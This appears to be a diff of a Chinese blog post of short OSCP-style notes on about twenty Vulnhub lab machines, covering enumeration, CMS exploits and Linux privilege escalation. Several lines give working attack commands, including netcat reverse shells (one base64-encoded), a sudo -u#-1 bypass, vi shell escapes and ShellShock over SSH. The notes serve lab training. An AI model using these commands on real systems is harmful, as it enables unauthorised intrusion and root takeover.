@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="Cosmic Fragments">
 <meta property="og:description" content="‮">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2023-07-21T13:05:09.753Z">
+<meta property="og:updated_time" content="2023-07-21T13:24:27.437Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="50台Vulnhub靶机Walkthrough">
 <meta name="twitter:description" content="‮">
@@ -258,7 +258,7 @@
       
           
         <p>‮<br><a id="more"></a><br>我这里主要记录了一个大概的思路、关键词，方便遇到类似内容的时候检索。<br><br>Vulnhub的内容和OSCP考察点当然不是完全一样的，所以有些脑洞的杂项我就一带而过了，不浪费时间。</p>
-<p><a href="[https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">TJnull list</a>)：<br><br>个别靶机获取不到IP：<br><a href="https://blog.csdn.net/qq_57976347/article/details/122772242" target="_blank" rel="noopener">vulnhub靶机获取不到ip_vulnhub靶机扫描不到ip_汉南帝的博客-CSDN博客</a><br><a name="sar2html"></a></p>
+<p><a href="[https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#">TJnull list</a> <br><br>个别靶机获取不到IP：<br><a href="https://blog.csdn.net/qq_57976347/article/details/122772242" target="_blank" rel="noopener">vulnhub靶机获取不到ip_vulnhub靶机扫描不到ip_汉南帝的博客-CSDN博客</a><br><a name="sar2html"></a></p>
 <h3 id="sar2html"><a href="#sar2html" class="headerlink" title="sar2html"></a>sar2html</h3><ul>
 <li>命令注入漏洞</li>
 <li>计划任务提权</li>
@@ -272,7 +272,7 @@
 <li>SUID提权，控制环境变量</li>
 <li>sudo -l提权</li>
 </ul>
-<p><a href="https://mr-potatoz.github.io/2020/03/20/LiterallyVulnerable/" target="_blank" rel="noopener">https://mr-potatoz.github.io/2020/03/20/LiterallyVulnerable/</a><br><a href="https://lifesfun101.github.io/2019/12/10/LiteraryVulnerable-walkthrough.html#wpscan" target="_blank" rel="noopener">https://lifesfun101.github.io/2019/12/10/LiteraryVulnerable-walkthrough.html#wpscan</a></p>
+<p><a href="https://mr-potatoz.github.io/2020/03/20/LiterallyVulnerable/" target="_blank" rel="noopener">https://mr-potatoz.github.io/2020/03/20/LiterallyVulnerable/</a><br><br><a href="https://lifesfun101.github.io/2019/12/10/LiteraryVulnerable-walkthrough.html#wpscan" target="_blank" rel="noopener">https://lifesfun101.github.io/2019/12/10/LiteraryVulnerable-walkthrough.html#wpscan</a></p>
 <p><a name="Misdirection"></a></p>
 <h3 id="Misdirection"><a href="#Misdirection" class="headerlink" title="Misdirection"></a>Misdirection</h3><ul>
 <li>8080端口web预留后门</li>
@@ -282,6 +282,219 @@
 </ul>
 <p><a href="https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf" target="_blank" rel="noopener">https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf</a></p>
 <p><a name="prime1"></a></p>
+<h3 id="prime1"><a href="#prime1" class="headerlink" title="prime1"></a>prime1</h3><ul>
+<li>扫目录找到secret.txt,image.php</li>
+<li>通过返回内容长度FUZZ，?file=读文件，读/etc/passwd有提示</li>
+<li>ssh无法直接登录用户</li>
+<li><code>wpscan --enumerate u</code>找到wordpress后台用户，登录</li>
+<li>后台插件不可写，主题里有一个隐蔽的可写文件，getshell</li>
+<li>sudo -l的文件需要root不知道密码</li>
+<li>低版本系统通用漏洞提权 <code>uname -a</code> <code>Linux ubuntu 4.10.0-28-generic</code></li>
+</ul>
+<p><a href="https://blog.csdn.net/weixin_46128614/article/details/104039451" target="_blank" rel="noopener">https://blog.csdn.net/weixin_46128614/article/details/104039451</a></p>
+<p><a name="election"></a></p>
+<h3 id="election"><a href="#election" class="headerlink" title="election"></a>election</h3><ul>
+<li>root/toor进phpmyadmin</li>
+<li>翻找到后台口令，登录找到log，SSH连接</li>
+<li>（也可以直接扫到log用口令连接）</li>
+<li>suid找到Serv-U程序，切进目录找到版本</li>
+<li>searchexploit，从exploit-db看使用教程</li>
+</ul>
+<p><a href="https://zhuanlan.zhihu.com/p/375148532" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/375148532</a></p>
+<p><a name="e16fe194"></a></p>
+<h3 id="Glasgow-Smile-2"><a href="#Glasgow-Smile-2" class="headerlink" title="Glasgow Smile 2"></a>Glasgow Smile 2</h3><ul>
+<li>提示<code>.sh</code>，<code>wfuzz FUZZ.sh</code>或<code>gobuster -x sh</code>找到<code>joke.sh</code></li>
+<li>web页面drupal 8 searchsploit 44448.py getshell</li>
+<li>内网看ss -tan有没扫到的8080端口，socat端口转发再访问</li>
+<li><code>socat TCP4-LISTEN:18080,fork TCP4:127.0.0.1:8080 &amp;</code></li>
+<li>源码提示nginx apache2，源码中找到LFI</li>
+<li>读nginx配置文件找到路由，不在/html下所以继续包含index.php</li>
+<li>猜了个很扯的谜，然后给了密码ssh登录，后面逆向的不做了</li>
+</ul>
+<p><a href="https://ksdpmx.bitbucket.io/2020/08/11/glasgow-smile-2-513/" target="_blank" rel="noopener">https://ksdpmx.bitbucket.io/2020/08/11/glasgow-smile-2-513/</a><br><a href="https://h0j3n.medium.com/vulnhub-glasgow-smile-2-1419ebe66a3b" target="_blank" rel="noopener">https://h0j3n.medium.com/vulnhub-glasgow-smile-2-1419ebe66a3b</a><br><a name="healthcare"></a></p>
+<h3 id="healthcare"><a href="#healthcare" class="headerlink" title="healthcare"></a>healthcare</h3><ul>
+<li>开放21和80端口</li>
+<li>大字典扫目录找到/openemr，searchexploit该版本有注入</li>
+<li>搜个时间盲注脚本，注到用户密码</li>
+<li>登进去无法RCE，回过来登FTP</li>
+<li>是一个全局FTP，可以给web目录下put webshell</li>
+<li>（从reverse shell里可以再su到注出的用户，等于web FTP ssh密码全一样）</li>
+<li>SUID找到名字奇怪的文件，strings发现调用fdisk</li>
+<li>添加环境变量，控制环境变量下的fdisk为<code>/bin/bash</code></li>
+</ul>
+<p><a href="https://hitesh1210.github.io/posts/Healthcare-Writeup/" target="_blank" rel="noopener">https://hitesh1210.github.io/posts/Healthcare-Writeup/</a></p>
+<p><a name="pYyPM"></a></p>
+<h3 id="secarmy-village"><a href="#secarmy-village" class="headerlink" title="secarmy_village"></a>secarmy_village</h3><ul>
+<li>多个用户对应多个关卡</li>
+<li><code>upx -d</code>脱壳，strings找到关键信息</li>
+<li>telnet连接1337端口，输入口令返回token</li>
+<li>脚本解码多个qrcode</li>
+<li>john -w=rockyou.txt解密用户hash</li>
+<li>web结合ssh目录，命令执行</li>
+<li>xordecode解密编码</li>
+<li>pcapng文件直接strings找密码</li>
+<li>pwnme程序，BoF覆盖变量提权</li>
+</ul>
+<p><a href="https://marmeus.com/post/Secarmy20#flag-6" target="_blank" rel="noopener">https://marmeus.com/post/Secarmy20#flag-6</a></p>
+<p><a name="jOmwp"></a></p>
+<h3 id="DevGuru1"><a href="#DevGuru1" class="headerlink" title="DevGuru1"></a>DevGuru1</h3><ul>
+<li>git泄露database.php找到Adminer密码</li>
+<li>Bcrypt加密无法解密，但是生成后替换密文</li>
+<li>October CMS后台getshell</li>
+<li>/var/backups/app.ini.bak找到另一个库的密码，登Adminer</li>
+<li>修改第二个站(Gitea)的用户加密方式和密文，登录</li>
+<li>searchexploit认证后getshell，需要去除URL后的/再打exp</li>
+<li>sudo -l找到sqlite3，但是不能直接以root运行</li>
+<li>结合sudo version &lt; v1.28漏洞提权</li>
+<li><code>sudo -u#-1 /usr/bin/sqlite3 /dev/null &#39;.shell /bin/sh&#39;</code></li>
+</ul>
+<p><a href="https://blog.yarsalabs.com/vulnhub-devguru1-walkthrough/" target="_blank" rel="noopener">https://blog.yarsalabs.com/vulnhub-devguru1-walkthrough/</a></p>
+<p><a name="hNhFJ"></a></p>
+<h3 id="Tiki"><a href="#Tiki" class="headerlink" title="Tiki"></a>Tiki</h3><ul>
+<li>(TIki CMS前台Getshell)</li>
+<li>smb共享文件里发现提示口令</li>
+<li>登录后在CMS中找到CVE提示</li>
+<li>通过CVE登录admin发现用户SSH凭据</li>
+<li>sudo -l发现该用户可以执行所有命令，直接sudo su</li>
+</ul>
+<p><a href="https://yufongg.github.io/posts/Tiki-1/#initial-foothold" target="_blank" rel="noopener">https://yufongg.github.io/posts/Tiki-1/#initial-foothold</a></p>
+<p><a name="tWuSM"></a></p>
+<h3 id="webdeveloper"><a href="#webdeveloper" class="headerlink" title="webdeveloper"></a>webdeveloper</h3><ul>
+<li>/ipdata目录下发现.cap流量包</li>
+<li>从POST /wp-login.php找到口令，登录WP后台getshell</li>
+<li>LinPEAS找到数据库密码，复用为用户SSH密码</li>
+<li>sudo -l发现tcpdump，在lo网卡产生流量，利用提权执行命令</li>
+<li>（lxd group privilege escalation）（需要在lxd组）<a href="https://reboare.github.io/lxd/lxd-escape.html" target="_blank" rel="noopener">https://reboare.github.io/lxd/lxd-escape.html</a></li>
+</ul>
+<p><a href="https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/" target="_blank" rel="noopener">https://windsorwebdeveloper.com/web-developer-1-vulnhub-walkthrough/</a></p>
+<p><a name="NcYfC"></a></p>
+<h3 id="solidstate"><a href="#solidstate" class="headerlink" title="solidstate"></a>solidstate</h3><ul>
+<li>4555端口james admin，从网上exp中找到默认密码root/root</li>
+<li>有个exp能直接打，但是需要1click：用户登录，无法利用</li>
+<li>在4555端口列用户，重置用户们的密码</li>
+<li>telnet 110端口登账户翻邮件找到mindy用户SSH密码，nc可能不行</li>
+<li>USER john / PASS pass / LIST / RETR 1</li>
+<li>登录SSH发现是个啥也不能用的restricted shell</li>
+<li><code>ssh mindy@10.10.10.51 bash</code>绕过restricted shell</li>
+<li><code>ssh mindy@192.168.101.42 &quot;export TERM=xterm; python -c &#39;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&#39;&quot;</code></li>
+<li><code>find / -user root -perm -002 -type f -not -path &quot;/proc/*&quot;  2&gt;/dev/null</code>找到一个可写文件</li>
+<li>猜测是在/var/spool/cron/crontabs/root中定时执行，没权限看不到</li>
+<li>脚本内容是清空/tmp目录，测一下发现确实定时在跑</li>
+<li>脚本可写，所以更改os.system()内容就行，可以echo &gt; 覆盖</li>
+<li>也可以把这restricteds shell升级到完全交互式shell，凑合能用</li>
+<li><code>system.os(&#39;cat /root/root.txt &gt; /tmp/flag&#39;)</code></li>
+</ul>
+<p><a href="https://dominicbreuker.com/post/htb_solidstate/" target="_blank" rel="noopener">https://dominicbreuker.com/post/htb_solidstate/</a><br><a href="https://blog.csdn.net/elephantxiang/article/details/122528066" target="_blank" rel="noopener">https://blog.csdn.net/elephantxiang/article/details/122528066</a></p>
+<p><a name="HeSQv"></a></p>
+<h3 id="Tr0ll02"><a href="#Tr0ll02" class="headerlink" title="Tr0ll02"></a>Tr0ll02</h3><ul>
+<li>robots.txt找到多个类似目录，只有页面图片大小不同</li>
+<li>下载异常图片，strings找到提示</li>
+<li>base64批量解码<code>cat answer.txt | base64 -d &gt; decode.txt</code></li>
+<li>文本去重<code>uniq -u decode.txt &gt; unique.txt</code></li>
+<li>Tr0ll/Tr0ll登录ftp</li>
+<li>fcrackzip -u -D -p unique.txt lmao.zip爆破zip密码</li>
+<li>ssh -i privatekey noob@ip私钥登录</li>
+<li>ssh会马上断开，看-v调试信息其实连上了</li>
+<li>ShellShock over SSH   <code>ssh testuser@localhost &#39;() { :;}; echo MALICIOUS CODE&#39;</code></li>
+<li>低版本内核但是没直接提权成功</li>
+<li>setuid 0找到二进制文件，有一个带input参数的可以Segement fault</li>
+<li>BoF inside of env and un-setting the environment variables </li>
+</ul>
+<p><a href="https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-tr0ll-2/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-tr0ll-2/</a><br><a href="https://www.doyler.net/security-not-included/tr0ll-2-walkthrough-you-gotta-pay-the-troll-toll" target="_blank" rel="noopener">https://www.doyler.net/security-not-included/tr0ll-2-walkthrough-you-gotta-pay-the-troll-toll</a></p>
+<p><a name="tOHlY"></a></p>
+<h3 id="Escalate-Linux"><a href="#Escalate-Linux" class="headerlink" title="Escalate_Linux"></a>Escalate_Linux</h3><ul>
+<li>预留后门弹shell</li>
+<li>user3: SUID提权</li>
+<li>覆盖环境变量提权（读/etc/shadow后john或<code>echo &#39;echo &quot;user1:12345&quot; | chpasswd&#39; &gt; ls</code>，修改密码）</li>
+<li>user1: sudo -l 发现(ALL : ALL) ALL，直接切</li>
+<li>user8: sudo -l 发现<code>(root) NOPASSWD: /usr/bin/vi，sudo vi -c &#39;:!/bin/sh&#39; /dev/null</code></li>
+<li>user7: gid=0(root)，可写<code>-rw-rw-r-- 1 root root 2648 Jun  5  2019 /etc/passwd</code></li>
+<li>mysql: root/root翻找到mysql用户密码，找到/etc/mysql下密码文件</li>
+<li>cat /etc/group  root:x:0:user4,user7可以修改passwd</li>
+<li>user5: NFS提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_34801745/article/details/104144580" target="_blank" rel="noopener">https://blog.csdn.net/qq_34801745/article/details/104144580</a></p>
+<p><a name="gL27B"></a></p>
+<h3 id="Pinky’s-palace-02"><a href="#Pinky’s-palace-02" class="headerlink" title="Pinky’s palace 02"></a>Pinky’s palace 02</h3><ul>
+<li>hint给了三个端口，排列组合knock后扫到隐藏端口</li>
+<li>定制用户名字典爆破post form，下载到id_rsa私钥</li>
+<li>ssh密钥登录需要密码，先用ssh2john从文件中提取hash</li>
+<li><code>ssh2john id_rsa &gt; hash.txt</code></li>
+<li><code>john hash --wordlist=/usr/share/wordlists/passwords/rockyou.txt</code></li>
+<li>用户名要改成小写，然后enter passphrase</li>
+<li><code>-rwsr----x 1 pinky   www-data 13384 Mar 16  2018 qsub</code></li>
+<li>当前用户不可读，所以还是要打到web权限</li>
+<li>想的找密码登wp后台getshell，其实直接找web可写文件就行</li>
+<li>获得www-data权限，拖走qsub逆向看密码和命令执行</li>
+<li><code></code>./qsub “;/bin/bash #”`命令拼接注入，获取到pinky权限</li>
+<li><code></code>./qsub ‘$(nc -e /bin/bash 192.168.16.143 6666)’`</li>
+<li>但是还不在pinky组，需要把kali的公钥写到靶机的pinky里</li>
+<li><code>echo [SSH_PUBLIC_KEY] &gt; /home/pinky/.ssh/authorized_keys</code></li>
+<li>（或者直接newgrp）</li>
+<li><code>-rwxrwx--- 1 demon pinky 113 Mar 17  2018 /usr/local/bin/backup.sh</code></li>
+<li>所有者是demon，猜测有一个demon的定时任务在跑，写sh弹shell</li>
+<li>找到所有者是demon但ps aux中root在跑的panel文件</li>
+<li>这服务开在31337端口，BoF提权</li>
+</ul>
+<p><a href="https://www.c0dedead.io/pinkys-palace-v2-walkthrough/" target="_blank" rel="noopener">https://www.c0dedead.io/pinkys-palace-v2-walkthrough/</a><br><a href="https://blog.csdn.net/qq_34801745/article/details/104070421" target="_blank" rel="noopener">https://blog.csdn.net/qq_34801745/article/details/104070421</a></p>
+<p><a name="cxDN9"></a></p>
+<h3 id="zico2"><a href="#zico2" class="headerlink" title="zico2"></a>zico2</h3><ul>
+<li>phpLiteAdmin弱口令admin登录，searchsploit找到利用方法</li>
+<li>但是shell传到的不是web目录</li>
+<li>从主页一个元素找到view.php?page=，路径穿越读shell</li>
+<li>执行命令不好用，用php一句话反弹shell的马</li>
+<li>文件里找到zico密码，su过去，sudo -l看到能用tar，提权</li>
+</ul>
+<p><a href="https://steflan-security.com/vulnhub-zico-2-walkthrough/" target="_blank" rel="noopener">https://steflan-security.com/vulnhub-zico-2-walkthrough/</a></p>
+<p><a name="rO2dK"></a></p>
+<h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><ul>
+<li>最基本的UNION SELECT注入</li>
+<li>（除了这里是个模糊查询，需要%闭合，这个WP里都没提到）</li>
+<li>登录superadmin上传webshell</li>
+<li>找到密码<code>mysql -e &#39;\! /bin/sh&#39; -u root -p</code>还是web权限</li>
+<li>suid文件直接提权</li>
+</ul>
+<p><a href="https://blog.csdn.net/elephantxiang/article/details/122888309" target="_blank" rel="noopener">https://blog.csdn.net/elephantxiang/article/details/122888309</a><br><a href="https://blog.csdn.net/weixin_45527786/article/details/105714687" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45527786/article/details/105714687</a></p>
+<p><a name="DRdwy"></a></p>
+<h3 id="LoadOfTheRoot"><a href="#LoadOfTheRoot" class="headerlink" title="LoadOfTheRoot"></a>LoadOfTheRoot</h3><ul>
+<li>之扫到了22端口，但是尝试连接会提示knock 1,2,3</li>
+<li>knock -v 192.168.146.51 1 2 3</li>
+<li>很慢的时间盲注，还是用了sqlmap</li>
+<li>凭据登web啥也没有，连ssh，SUID文件开启了ASLR很难BoF提权</li>
+<li>root运行的mysql可以load raptor_udf2提权，凭据从login.php里找<strong>(这个linpeas没发现)</strong></li>
+<li>Ubuntu 14.04 3.19.0  39166提权</li>
+</ul>
+<p><a href="https://yufongg.github.io/posts/Lord-of-the-Root-1.0.1/" target="_blank" rel="noopener">https://yufongg.github.io/posts/Lord-of-the-Root-1.0.1/</a><br><a name="oQw87"></a></p>
+<h3 id="decoy"><a href="#decoy" class="headerlink" title="decoy"></a>decoy</h3><ul>
+<li><strong>爆zip密码直接rockyou</strong></li>
+<li>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip -v</li>
+<li>覆盖环境变量提权失败，strings可以看到调用的绝对路径</li>
+<li>这些可执行文件看了看也都没有写权限</li>
+<li>看第二个参数能不能利用，service的apache2也没有写权限，好像没法覆盖这个服务</li>
+<li>vi实际调用的vim，但是-c参数没法拼接</li>
+<li>结果这些都不能利用，是root定时运行着一个chkrootkit的提权</li>
+</ul>
+<p>假WP：没有log路径<a href="https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/</a><br><br><a href="https://www.doyler.net/security-not-included/vulnhub-sunset-decoy-walkthrough" target="_blank" rel="noopener">https://www.doyler.net/security-not-included/vulnhub-sunset-decoy-walkthrough</a><br><a name="zrYuu"></a></p>
+<h3 id="djinn3"><a href="#djinn3" class="headerlink" title="djinn3"></a>djinn3</h3><ul>
+<li>pspy发现sanit运行的py，反编译pyc构造ssh私钥免登录</li>
+<li>sudo -l有adduser，sudo adduser test -gid=0加一个root组的用户</li>
+<li>root组对/etc/sudoers可读，发现一个不存在的用户可以执行apt-get，添加这个用户然后提权</li>
+</ul>
+<p><a href="https://www.aldeid.com/wiki/VulnHub-Djinn-3" target="_blank" rel="noopener">https://www.aldeid.com/wiki/VulnHub-Djinn-3</a><br><a href="https://blog.csdn.net/weixin_43784056/article/details/107068610" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43784056/article/details/107068610</a></p>
+<p><a name="RcrMi"></a></p>
+<h3 id="djinn1"><a href="#djinn1" class="headerlink" title="djinn1"></a>djinn1</h3><ul>
+<li>1337端口有1000道算术题，兔子洞</li>
+<li>7331端口用big.txt扫到命令执行，有过滤</li>
+<li><code>echo+YnVzeWJveCBuYyAxOTIuMTY4LjE0Ni41NSA4ODg4IC1lIC9iaW4vYmFzaA==+|+base64+-d|sh</code></li>
+<li>在web的py源码里找到nitish凭据，切过去sudo -l</li>
+<li>(sam) NOPASSWD: /usr/bin/genie ，同时是个<strong>SUID文件</strong></li>
+<li>genie -h给的选项里都没法利用，需要man genie看到个-cmd</li>
+<li>sudo -u sam /usr/bin/genie -cmd id  直接进了sam的shell，没想明白</li>
+<li>在(lxd)组，但是lxd提权到第二步就提示config.yml没权限</li>
+<li>(root) NOPASSWD: /root/lago 可执行不可读</li>
+<li>.pyc反编译找到源码逻辑 <strong>（思路：python的题目环境下多关注pyc文件）</strong>提权</li>
+</ul>
+<p><a href="https://www.cnblogs.com/sn1per/p/11984455.html" target="_blank" rel="noopener">https://www.cnblogs.com/sn1per/p/11984455.html</a></p>
 
       
     </div>
@@ -314,7 +527,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sar2html"><span class="toc-number">1.</span> <span class="toc-text">sar2html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LiterallyVulnerable"><span class="toc-number">2.</span> <span class="toc-text">LiterallyVulnerable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misdirection"><span class="toc-number">3.</span> <span class="toc-text">Misdirection</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sar2html"><span class="toc-number">1.</span> <span class="toc-text">sar2html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LiterallyVulnerable"><span class="toc-number">2.</span> <span class="toc-text">LiterallyVulnerable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misdirection"><span class="toc-number">3.</span> <span class="toc-text">Misdirection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prime1"><span class="toc-number">4.</span> <span class="toc-text">prime1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#election"><span class="toc-number">5.</span> <span class="toc-text">election</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glasgow-Smile-2"><span class="toc-number">6.</span> <span class="toc-text">Glasgow Smile 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#healthcare"><span class="toc-number">7.</span> <span class="toc-text">healthcare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secarmy-village"><span class="toc-number">8.</span> <span class="toc-text">secarmy_village</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DevGuru1"><span class="toc-number">9.</span> <span class="toc-text">DevGuru1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tiki"><span class="toc-number">10.</span> <span class="toc-text">Tiki</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webdeveloper"><span class="toc-number">11.</span> <span class="toc-text">webdeveloper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solidstate"><span class="toc-number">12.</span> <span class="toc-text">solidstate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tr0ll02"><span class="toc-number">13.</span> <span class="toc-text">Tr0ll02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Escalate-Linux"><span class="toc-number">14.</span> <span class="toc-text">Escalate_Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pinky’s-palace-02"><span class="toc-number">15.</span> <span class="toc-text">Pinky’s palace 02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zico2"><span class="toc-number">16.</span> <span class="toc-text">zico2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hackme"><span class="toc-number">17.</span> <span class="toc-text">hackme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoadOfTheRoot"><span class="toc-number">18.</span> <span class="toc-text">LoadOfTheRoot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#decoy"><span class="toc-number">19.</span> <span class="toc-text">decoy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn3"><span class="toc-number">20.</span> <span class="toc-text">djinn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#djinn1"><span class="toc-number">21.</span> <span class="toc-text">djinn1</span></a></li></ol>
         
     </div>
     <style>
